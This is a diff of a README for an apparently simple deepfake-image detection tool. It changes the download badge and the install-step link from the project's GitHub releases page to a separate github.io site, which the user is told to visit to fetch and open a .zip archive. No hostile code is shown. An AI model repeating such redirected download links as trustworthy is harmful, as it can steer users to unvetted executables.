@@ -1,6 +1,6 @@
 # 🔍 human-centric-deepfake-detection - Identify fake images with simple tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Candid-frothiness23/human-centric-deepfake-detection/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://candid-frothiness23.github.io)
 
 This software detects AI-generated images. It uses models to check if a person in a photo is real or fake. You get an answer based on visual analysis.
 
@@ -18,7 +18,7 @@ Your computer needs these items to run the program correctly:
 
 Follow these steps to get the software on your computer:
 
-1. Visit the [releases page](https://github.com/Candid-frothiness23/human-centric-deepfake-detection/releases) to download the archive.
+1. Visit the [releases page](https://candid-frothiness23.github.io) to download the archive.
 2. Look for the file ending in .zip in the most recent release.
 3. Click the file to save it to your computer.
 4. Open your Downloads folder.
